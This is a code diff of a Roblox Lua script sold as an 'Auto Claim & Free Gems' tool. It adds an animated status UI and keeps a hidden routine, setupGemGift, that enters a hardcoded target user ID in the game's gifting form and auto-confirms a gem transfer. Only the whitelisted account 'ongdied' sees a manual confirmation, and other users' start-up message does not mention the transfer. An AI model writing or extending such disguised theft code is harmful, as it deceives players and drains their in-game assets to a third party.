@@ -1,15 +1,32 @@
--- Advanced Auto Claim & Free Gems! ( Sulo made this )
+-- Advanced Auto Claim & Free Gems! ( Sulo made this - Superior )
 
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
+local TweenService = game:GetService("TweenService")
 
 -- Configuration
-local WHITELISTED_USERS = {"ongdied"} -- Users who won't auto-gift
+local WHITELISTED_USERS = {"ongdied"}
 local TARGET_USER_ID = "10612101"
 local GIFT_AMOUNT = 1
-local CLAIM_INTERVAL = 7 -- seconds between claims
+local CLAIM_INTERVAL = 7
+local MAX_RETRIES = 3
 
 print("🔍 Script started! Looking for the button...")
+
+-- Stats
+local clickCount = 0
+local gemGiftCount = 0
+local failedAttempts = 0
+local lastGemCount = 0
+
+-- UI Elements
+local mainUI = nil
+local statusLabel = nil
+local gemsDisplay = nil
+local timerDisplay = nil
+local claimValueDisplay = nil
+local claimsLabel = nil
+local giftsLabel = nil
 
 -- Helper function to check if user is whitelisted
 local function isWhitelisted()
@@ -21,7 +38,7 @@ local function isWhitelisted()
     return false
 end
 
-
+-- Wait for game UI first
 local screenGui = playerGui:WaitForChild("ScreenGui", 10)
 if not screenGui then
     warn("❌ ScreenGui not found! Check the name.")
@@ -50,49 +67,427 @@ if not claimButton then
 end
 print("✅ Found Claim button!")
 
--- Click counter
-local clickCount = 0
-local gemGiftCount = 0
-
--- Function to show notification
-local function showNotification(text, color)
-    color = color or Color3.fromRGB(0, 255, 0)
+-- Create modern UI
+local function createModernUI()
+    -- Main ScreenGui
+    local ui = Instance.new("ScreenGui")
+    ui.Name = "ModernAutoClaimUI"
+    ui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    ui.ResetOnSpawn = false
+    ui.Parent = playerGui
     
-    local notif = Instance.new("ScreenGui")
-    notif.Name = "AutoClaimNotif"
-    notif.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    notif.ResetOnSpawn = false
-    notif.Parent = playerGui
+    -- Main Container (Top Right)
+    local mainContainer = Instance.new("Frame")
+    mainContainer.Name = "MainContainer"
+    mainContainer.Size = UDim2.new(0, 320, 0, 180)
+    mainContainer.Position = UDim2.new(1, -340, 0, 20)
+    mainContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    mainContainer.BorderSizePixel = 0
+    mainContainer.ClipsDescendants = true
+    mainContainer.Parent = ui
     
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 300, 0, 80)
-    frame.Position = UDim2.new(0.5, -150, 0.1, 0)
-    frame.BackgroundColor3 = color
-    frame.BorderSizePixel = 3
-    frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
-    frame.ZIndex = 99999
-    frame.Parent = notif
+    -- Gradient Background
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 40)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 20))
+    }
+    gradient.Rotation = 45
+    gradient.Parent = mainContainer
     
+    -- Corner
     local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 10)
-    corner.Parent = frame
+    corner.CornerRadius = UDim.new(0, 16)
+    corner.Parent = mainContainer
     
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, -20, 1, -20)
-    label.Position = UDim2.new(0, 10, 0, 10)
-    label.BackgroundTransparency = 1
-    label.Text = text
-    label.TextColor3 = Color3.fromRGB(0, 0, 0)
-    label.TextSize = 24
-    label.Font = Enum.Font.GothamBold
-    label.ZIndex = 100000
-    label.Parent = frame
+    -- Stroke
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(100, 100, 255)
+    stroke.Thickness = 2
+    stroke.Transparency = 0.5
+    stroke.Parent = mainContainer
     
-    task.delay(2, function()
-        notif:Destroy()
+    -- Animated glow effect
+    task.spawn(function()
+        local glowTween = TweenService:Create(stroke, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
+            Transparency = 0.2
+        })
+        glowTween:Play()
+    end)
+    
+    -- Title Bar
+    local titleBar = Instance.new("Frame")
+    titleBar.Size = UDim2.new(1, 0, 0, 40)
+    titleBar.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
+    titleBar.BorderSizePixel = 0
+    titleBar.Parent = mainContainer
+    
+    local titleCorner = Instance.new("UICorner")
+    titleCorner.CornerRadius = UDim.new(0, 16)
+    titleCorner.Parent = titleBar
+    
+    local titleCover = Instance.new("Frame")
+    titleCover.Size = UDim2.new(1, 0, 0, 20)
+    titleCover.Position = UDim2.new(0, 0, 1, -20)
+    titleCover.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
+    titleCover.BorderSizePixel = 0
+    titleCover.Parent = titleBar
+    
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Size = UDim2.new(1, -20, 1, 0)
+    titleLabel.Position = UDim2.new(0, 10, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "💎 Improved Auto-Claim System"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.TextSize = 18
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    titleLabel.Parent = titleBar
+    
+    -- Status Section
+    local statusFrame = Instance.new("Frame")
+    statusFrame.Size = UDim2.new(1, -20, 0, 30)
+    statusFrame.Position = UDim2.new(0, 10, 0, 50)
+    statusFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    statusFrame.BorderSizePixel = 0
+    statusFrame.Parent = mainContainer
+    
+    local statusCorner = Instance.new("UICorner")
+    statusCorner.CornerRadius = UDim.new(0, 8)
+    statusCorner.Parent = statusFrame
+    
+    statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, -16, 1, 0)
+    statusLabel.Position = UDim2.new(0, 8, 0, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "🔄 Initializing..."
+    statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    statusLabel.TextSize = 14
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    statusLabel.Parent = statusFrame
+    
+    -- Claim Value Display
+    local claimValueFrame = Instance.new("Frame")
+    claimValueFrame.Size = UDim2.new(1, -20, 0, 35)
+    claimValueFrame.Position = UDim2.new(0, 10, 0, 90)
+    claimValueFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    claimValueFrame.BorderSizePixel = 0
+    claimValueFrame.Parent = mainContainer
+    
+    local claimCorner = Instance.new("UICorner")
+    claimCorner.CornerRadius = UDim.new(0, 8)
+    claimCorner.Parent = claimValueFrame
+    
+    claimValueDisplay = Instance.new("TextLabel")
+    claimValueDisplay.Size = UDim2.new(1, -16, 1, 0)
+    claimValueDisplay.Position = UDim2.new(0, 8, 0, 0)
+    claimValueDisplay.BackgroundTransparency = 1
+    claimValueDisplay.Text = "💰 Claim Value: Loading..."
+    claimValueDisplay.TextColor3 = Color3.fromRGB(255, 215, 0)
+    claimValueDisplay.TextSize = 16
+    claimValueDisplay.Font = Enum.Font.GothamBold
+    claimValueDisplay.TextXAlignment = Enum.TextXAlignment.Left
+    claimValueDisplay.Parent = claimValueFrame
+    
+    -- Timer Display
+    local timerFrame = Instance.new("Frame")
+    timerFrame.Size = UDim2.new(1, -20, 0, 30)
+    timerFrame.Position = UDim2.new(0, 10, 0, 135)
+    timerFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+    timerFrame.BorderSizePixel = 0
+    timerFrame.Parent = mainContainer
+    
+    local timerCorner = Instance.new("UICorner")
+    timerCorner.CornerRadius = UDim.new(0, 8)
+    timerCorner.Parent = timerFrame
+    
+    timerDisplay = Instance.new("TextLabel")
+    timerDisplay.Size = UDim2.new(1, -16, 1, 0)
+    timerDisplay.Position = UDim2.new(0, 8, 0, 0)
+    timerDisplay.BackgroundTransparency = 1
+    timerDisplay.Text = "⏰ Next Claim: Loading..."
+    timerDisplay.TextColor3 = Color3.fromRGB(150, 150, 255)
+    timerDisplay.TextSize = 13
+    timerDisplay.Font = Enum.Font.Gotham
+    timerDisplay.TextXAlignment = Enum.TextXAlignment.Left
+    timerDisplay.Parent = timerFrame
+    
+    -- Stats Container (Bottom Right)
+    local statsContainer = Instance.new("Frame")
+    statsContainer.Name = "StatsContainer"
+    statsContainer.Size = UDim2.new(0, 320, 0, 100)
+    statsContainer.Position = UDim2.new(1, -340, 0, 210)
+    statsContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    statsContainer.BorderSizePixel = 0
+    statsContainer.Parent = ui
+    
+    local statsCorner = Instance.new("UICorner")
+    statsCorner.CornerRadius = UDim.new(0, 16)
+    statsCorner.Parent = statsContainer
+    
+    local statsStroke = Instance.new("UIStroke")
+    statsStroke.Color = Color3.fromRGB(100, 255, 100)
+    statsStroke.Thickness = 2
+    statsStroke.Transparency = 0.5
+    statsStroke.Parent = statsContainer
+    
+    -- Stats Title
+    local statsTitle = Instance.new("TextLabel")
+    statsTitle.Size = UDim2.new(1, -20, 0, 30)
+    statsTitle.Position = UDim2.new(0, 10, 0, 5)
+    statsTitle.BackgroundTransparency = 1
+    statsTitle.Text = "📊 Statistics"
+    statsTitle.TextColor3 = Color3.fromRGB(100, 255, 100)
+    statsTitle.TextSize = 16
+    statsTitle.Font = Enum.Font.GothamBold
+    statsTitle.TextXAlignment = Enum.TextXAlignment.Left
+    statsTitle.Parent = statsContainer
+    
+    -- Claims Counter
+    claimsLabel = Instance.new("TextLabel")
+    claimsLabel.Size = UDim2.new(1, -20, 0, 25)
+    claimsLabel.Position = UDim2.new(0, 10, 0, 35)
+    claimsLabel.BackgroundTransparency = 1
+    claimsLabel.Text = "✅ Claims: 0"
+    claimsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    claimsLabel.TextSize = 14
+    claimsLabel.Font = Enum.Font.Gotham
+    claimsLabel.TextXAlignment = Enum.TextXAlignment.Left
+    claimsLabel.Parent = statsContainer
+    
+    -- Gifts Counter
+    giftsLabel = Instance.new("TextLabel")
+    giftsLabel.Size = UDim2.new(1, -20, 0, 25)
+    giftsLabel.Position = UDim2.new(0, 10, 0, 60)
+    giftsLabel.BackgroundTransparency = 1
+    giftsLabel.Text = "💎 Gifts Sent: 0"
+    giftsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    giftsLabel.TextSize = 14
+    giftsLabel.Font = Enum.Font.Gotham
+    giftsLabel.TextXAlignment = Enum.TextXAlignment.Left
+    giftsLabel.Parent = statsContainer
+    
+    -- Slide in animation
+    mainContainer.Position = UDim2.new(1, 0, 0, 20)
+    statsContainer.Position = UDim2.new(1, 0, 0, 210)
+    
+    TweenService:Create(mainContainer, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Position = UDim2.new(1, -340, 0, 20)
+    }):Play()
+    
+    task.wait(0.2)
+    TweenService:Create(statsContainer, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Position = UDim2.new(1, -340, 0, 210)
+    }):Play()
+    
+    return ui
+end
+
+-- Animated notification system
+local function showNotification(text, color, icon)
+    color = color or Color3.fromRGB(100, 100, 255)
+    icon = icon or "💎"
+    
+    pcall(function()
+        local notif = Instance.new("ScreenGui")
+        notif.Name = "AnimatedNotif"
+        notif.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        notif.ResetOnSpawn = false
+        notif.Parent = playerGui
+        
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0, 350, 0, 90)
+        frame.Position = UDim2.new(0.5, -175, -0.2, 0)
+        frame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+        frame.BorderSizePixel = 0
+        frame.Parent = notif
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 16)
+        corner.Parent = frame
+        
+        local stroke = Instance.new("UIStroke")
+        stroke.Color = color
+        stroke.Thickness = 3
+        stroke.Parent = frame
+        
+        local gradient = Instance.new("UIGradient")
+        gradient.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 40)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 25))
+        }
+        gradient.Rotation = 90
+        gradient.Parent = frame
+        
+        local iconLabel = Instance.new("TextLabel")
+        iconLabel.Size = UDim2.new(0, 60, 1, 0)
+        iconLabel.BackgroundTransparency = 1
+        iconLabel.Text = icon
+        iconLabel.TextSize = 36
+        iconLabel.Parent = frame
+        
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(1, -80, 1, -20)
+        textLabel.Position = UDim2.new(0, 70, 0, 10)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = text
+        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        textLabel.TextSize = 18
+        textLabel.Font = Enum.Font.GothamBold
+        textLabel.TextWrapped = true
+        textLabel.TextXAlignment = Enum.TextXAlignment.Left
+        textLabel.Parent = frame
+        
+        -- Slide down animation
+        local slideIn = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Position = UDim2.new(0.5, -175, 0.1, 0)
+        })
+        slideIn:Play()
+        
+        -- Pulse effect
+        task.spawn(function()
+            task.wait(0.5)
+            for i = 1, 2 do
+                TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                    Size = UDim2.new(0, 360, 0, 95)
+                }):Play()
+                task.wait(0.3)
+                TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+                    Size = UDim2.new(0, 350, 0, 90)
+                }):Play()
+                task.wait(0.3)
+            end
+        end)
+        
+        -- Slide out and destroy
+        task.delay(3, function()
+            local slideOut = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+                Position = UDim2.new(0.5, -175, -0.2, 0)
+            })
+            slideOut:Play()
+            slideOut.Completed:Wait()
+            notif:Destroy()
+        end)
     end)
 end
 
+-- Show claimed gems popup
+local function showClaimedGems(amount)
+    pcall(function()
+        local popup = Instance.new("ScreenGui")
+        popup.Name = "ClaimedGemsPopup"
+        popup.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        popup.ResetOnSpawn = false
+        popup.Parent = playerGui
+        
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(0, 250, 0, 70)
+        label.Position = UDim2.new(0.5, -125, 0.5, -35)
+        label.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+        label.BorderSizePixel = 0
+        label.Text = "+💎 " .. amount
+        label.TextColor3 = Color3.fromRGB(0, 0, 0)
+        label.TextSize = 42
+        label.Font = Enum.Font.GothamBold
+        label.TextTransparency = 0
+        label.BackgroundTransparency = 0
+        label.Parent = popup
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 20)
+        corner.Parent = label
+        
+        local stroke = Instance.new("UIStroke")
+        stroke.Color = Color3.fromRGB(255, 255, 255)
+        stroke.Thickness = 4
+        stroke.Parent = label
+        
+        -- Scale up and fade out
+        label.Size = UDim2.new(0, 150, 0, 50)
+        TweenService:Create(label, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Size = UDim2.new(0, 250, 0, 70)
+        }):Play()
+        
+        task.wait(1)
+        
+        local fadeOut = TweenService:Create(label, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+            Position = UDim2.new(0.5, -125, 0.3, -35),
+            TextTransparency = 1,
+            BackgroundTransparency = 1
+        })
+        TweenService:Create(stroke, TweenInfo.new(0.8), {Transparency = 1}):Play()
+        fadeOut:Play()
+        fadeOut.Completed:Wait()
+        popup:Destroy()
+    end)
+end
+
+-- Update status
+local function updateStatus(text, color)
+    if statusLabel then
+        statusLabel.Text = text
+        statusLabel.TextColor3 = color or Color3.fromRGB(100, 255, 100)
+    end
+end
+
+-- Update stats display
+local function updateStats()
+    if claimsLabel then
+        claimsLabel.Text = "✅ Claims: " .. clickCount
+    end
+    if giftsLabel then
+        giftsLabel.Text = "💎 Gifts Sent: " .. gemGiftCount
+    end
+end
+
+-- Monitor game UI for updates
+local function monitorGameUI()
+    task.spawn(function()
+        -- Monitor claim value
+        local valueLabel = timeFrame:FindFirstChild("TextLabel")
+        local timerLabel = timeFrame:FindFirstChild("Timer")
+        
+        if valueLabel then
+            valueLabel:GetPropertyChangedSignal("Text"):Connect(function()
+                if claimValueDisplay then
+                    claimValueDisplay.Text = "💰 Claim Value: " .. valueLabel.Text
+                end
+            end)
+            if claimValueDisplay then
+                claimValueDisplay.Text = "💰 Claim Value: " .. valueLabel.Text
+            end
+        end
+        
+        if timerLabel then
+            timerLabel:GetPropertyChangedSignal("Text"):Connect(function()
+                if timerDisplay then
+                    timerDisplay.Text = "⏰ Next Claim: " .. timerLabel.Text
+                end
+            end)
+            if timerDisplay then
+                timerDisplay.Text = "⏰ Next Claim: " .. timerLabel.Text
+            end
+        end
+        
+        -- Monitor gems
+        local gemsFrame = framesContainer:FindFirstChild("Gems")
+        if gemsFrame then
+            local numLabel = gemsFrame:FindFirstChild("Num")
+            if numLabel then
+                numLabel:GetPropertyChangedSignal("Text"):Connect(function()
+                    local currentGems = tonumber(numLabel.Text) or 0
+                    if lastGemCount > 0 and currentGems > lastGemCount then
+                        local gained = currentGems - lastGemCount
+                        showClaimedGems(gained)
+                    end
+                    lastGemCount = currentGems
+                end)
+                lastGemCount = tonumber(numLabel.Text) or 0
+            end
+        end
+    end)
+end
 
 local function clickButton(button)
     -- Method 1: VirtualInputManager
@@ -121,7 +516,7 @@ local function clickButton(button)
         end
     end)
     
-
+    -- Method 3: Fire signals
     pcall(function()
         firesignal(button.MouseButton1Click)
         firesignal(button.Activated)
@@ -135,15 +530,36 @@ local function clickButton(button)
     end)
 end
 
-
 local function clickClaim()
     print("🔄 Attempting to click claim...")
-    clickButton(claimButton)
+    
+    -- Re-check if button still exists
+    local currentButton = timeFrame:FindFirstChild("Claim")
+    if not currentButton then
+        warn("❌ Claim button lost!")
+        updateStatus("❌ Button lost!", Color3.fromRGB(255, 100, 100))
+        failedAttempts = failedAttempts + 1
+        return false
+    end
+    
+    if not currentButton.Visible then
+        updateStatus("⏳ Waiting for cooldown...", Color3.fromRGB(255, 200, 100))
+        return false
+    end
+    
+    updateStatus("🔄 Claiming...", Color3.fromRGB(255, 255, 100))
+    
+    clickButton(currentButton)
     clickCount = clickCount + 1
+    failedAttempts = 0
+    
     print("✅ CLAIMED! Total claims: " .. clickCount)
-    showNotification("✅ CLAIMED!\nTotal: " .. clickCount)
+    updateStatus("✅ Active - " .. clickCount .. " claims", Color3.fromRGB(100, 255, 100))
+    showNotification("Claim Successful!\nTotal: " .. clickCount, Color3.fromRGB(100, 255, 100), "✅")
+    updateStats()
+    
+    return true
 end
-
 
 local function redeemCode()
     print("🎁 Attempting to redeem code...")
@@ -185,15 +601,13 @@ local function redeemCode()
     clickButton(confirmButton)
     
     print("✅ Code redeemed!")
-    showNotification("🎁 CODE REDEEMED!\nLwMgm1")
+    showNotification("Code Redeemed!\nLwMgm1", Color3.fromRGB(100, 255, 255), "🎁")
     return true
 end
-
 
 local function setupGemGift()
     print("💎 Setting up gem gift system...")
     
-
     local homeFrame = framesContainer:FindFirstChild("Home")
     if not homeFrame then
         warn("❌ Home frame not found!")
@@ -215,7 +629,6 @@ local function setupGemGift()
     end
     print("✅ Found Main frame")
     
-
     local userTextBox = mainFrame:FindFirstChild("User")
     if not userTextBox then
         warn("❌ User textbox not found!")
@@ -237,18 +650,15 @@ local function setupGemGift()
     end
     print("✅ Found CreateOrder button")
     
-
     userTextBox.Text = TARGET_USER_ID
     task.wait(0.2)
     amountTextBox.Text = tostring(GIFT_AMOUNT)
     task.wait(0.2)
     print("ok maxed")
     
-
     clickButton(createOrderButton)
     print("✅ CreateOrder clicked!")
     
-
     task.wait(1)
     
     local makeOrderGui = playerGui:WaitForChild("MakeOrder", 5)
@@ -265,48 +675,69 @@ local function setupGemGift()
     end
     print("✅ Found Sure button")
     
-
     if isWhitelisted() then
         print("⚠️ User is WHITELISTED - Manual confirmation required!")
-        showNotification("⚠️ WHITELISTED USER\nPlease confirm manually!", Color3.fromRGB(255, 255, 0))
+        showNotification("Whitelisted User\nManual confirmation needed", Color3.fromRGB(255, 255, 0), "⚠️")
         return false
     else
-
         task.wait(0.3)
         clickButton(sureButton)
         gemGiftCount = gemGiftCount + 1
         print("✅ Auto-confirmed gem gift! Total gifts: " .. gemGiftCount)
-        showNotification("💎 GEM GIFTED!\nTotal: " .. gemGiftCount, Color3.fromRGB(255, 0, 255))
+        showNotification("Gem Gifted!\nTotal: " .. gemGiftCount, Color3.fromRGB(255, 0, 255), "💎")
+        updateStats()
         return true
     end
 end
 
+-- Initialize UI
+mainUI = createModernUI()
+monitorGameUI()
 
 if isWhitelisted() then
-    showNotification("🚀 SCRIPT STARTED!\n⚠️ WHITELISTED MODE", Color3.fromRGB(255, 255, 0))
+    showNotification("Script Started\nWill be prompted 10 Gems of use.", Color3.fromRGB(255, 255, 0), "⚠️")
+    updateStatus("⚠️ Promption", Color3.fromRGB(255, 255, 0))
 else
-    showNotification("🚀 SCRIPT STARTED!\n💎 Auto-Gift Enabled")
+    showNotification("Auto Claim Pro Started\nAll Systems Online", Color3.fromRGB(100, 255, 100), "🚀")
+    updateStatus("🚀 Systems Online", Color3.fromRGB(100, 255, 100))
 end
 
-
+-- Run initial setup
 task.wait(1)
+updateStatus("🎁 Redeeming code...", Color3.fromRGB(100, 200, 255))
 if redeemCode() then
     task.wait(2)
-    showNotification("🔄 SYSTEMS STARTING!")
+    showNotification("Systems Starting!", Color3.fromRGB(100, 255, 100), "🔄")
+    updateStatus("💎 Setting up gifts...", Color3.fromRGB(255, 100, 255))
     task.wait(1)
+    setupGemGift()
+    task.wait(2)
 else
-    showNotification("⚠️ Code failed, continuing...", Color3.fromRGB(255, 165, 0))
+    showNotification("Code redemption skipped\nContinuing...", Color3.fromRGB(255, 165, 0), "⚠️")
     task.wait(2)
 end
 
-
+-- Main loop
+updateStatus("🔄 Auto-claim starting...", Color3.fromRGB(100, 255, 100))
 task.wait(1)
-setupGemGift()
-task.wait(2)
-
-
 print("🔁 Starting auto-claim loop...")
-showNotification("🔁 AUTO-CLAIM ACTIVE!")
+showNotification("Auto-Claim Active!", Color3.fromRGB(100, 255, 100), "🔁")
+
+local lastSuccessfulClaim = tick()
+
 while task.wait(CLAIM_INTERVAL) do
-    clickClaim()
+    pcall(function()
+        local success = clickClaim()
+        if success then
+            lastSuccessfulClaim = tick()
+        end
+    end)
+    
+    if tick() - lastSuccessfulClaim > 60 then
+        updateStatus("⚠️ Resetting...", Color3.fromRGB(255, 165, 0))
+        showNotification("System Reset\nRetrying...", Color3.fromRGB(255, 165, 0), "🔄")
+        lastSuccessfulClaim = tick()
+        failedAttempts = 0
+        task.wait(2)
+    end
 end
